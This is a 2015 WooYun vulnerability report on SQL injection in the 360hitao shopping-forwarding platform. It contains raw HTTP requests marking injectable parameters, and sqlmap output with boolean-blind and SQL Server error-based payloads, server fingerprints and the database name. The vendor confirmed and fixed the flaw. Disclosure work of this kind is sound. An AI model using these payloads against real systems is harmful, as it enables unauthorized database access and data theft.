wybug_title: 百世旗下海淘转运平台多处SQL注入
wybug_detail:
漏洞详情 披露状态：   									2015-11-21：	细节已通知厂商并且等待厂商处理中									2015-11-22：	厂商已经确认，细节仅向厂商公开									2015-12-02：	细节向核心白帽子及相关领域专家公开									2015-12-12：	细节向普通白帽子公开									2015-12-22：	细节向实习白帽子公开									2016-01-11：	细节向公众公开  简要描述： 打包求20rank 详细说明：  
1,json参数注入POST /member/ashx/topic.ashx HTTP/1.1Content-Length: 292Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://member.360hitao.com/Cookie: ASP.NET_SessionId=av0ljmpqgkf3pv1dwp1z4e1o; token=; TopicsPage=/member/bbs/topicTile.aspxHost: member.360hitao.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*cond=%7b%22byTime%22:2%2c%22country%22:%22ger%22%2c%22exclude%22:%221851339668408203%2c1853758958613281%2c1854788346464843*%22%2c%22keyCodes%22:%22%22%2c%22orderBy%22:0%2c%22source%22:0%2c%22topicType%22:%22all%22%7d&CurrentPage=1&methods=Paging2.GET /daogou/Second/Index.aspx?searchIndex=1&searchKey=Similac HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://member.360hitao.com/Cookie: ASP.NET_SessionId=av0ljmpqgkf3pv1dwp1z4e1o; token=; TopicsPage=/member/bbs/topicTile.aspxHost: member.360hitao.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*3.GET /Store_Rebates/store/storedetailproduct.aspx?cat=4 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://member.360hitao.com/Cookie: ASP.NET_SessionId=av0ljmpqgkf3pv1dwp1z4e1o; token=; TopicsPage=/member/bbs/topicTile.aspxHost: member.360hitao.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*
   漏洞证明：  
---Parameter: #1* ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cond={"byTime":2,"country":"ger","exclude":"1851339668408203,1853758958613281,1854788346464843' AND 2244=2244 AND 'HttV'='HttV","keyCodes":"","orderBy":0,"source":0,"topicType":"all"}&CurrentPage=1&methods=Paging    Vector: AND [INFERENCE]    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)    Payload: cond={"byTime":2,"country":"ger","exclude":"1851339668408203,1853758958613281,1854788346464843' AND 8446 IN ((CHAR(113)+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8446=8446) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(98)+CHAR(113))) AND 'rfDz'='rfDz","keyCodes":"","orderBy":0,"source":0,"topicType":"all"}&CurrentPage=1&methods=Paging    Vector: AND [RANDNUM] IN (('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008current user:    'hitao'current database: 'bestweb'因为不停的封IP，所以就不跑数据了。
   修复方案：  fix   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-11-22 10:51 厂商回复： 您好，漏洞确认存在，已经在处理。感谢您对百世安全的关注！ 最新状态： 2015-11-24：已修复。
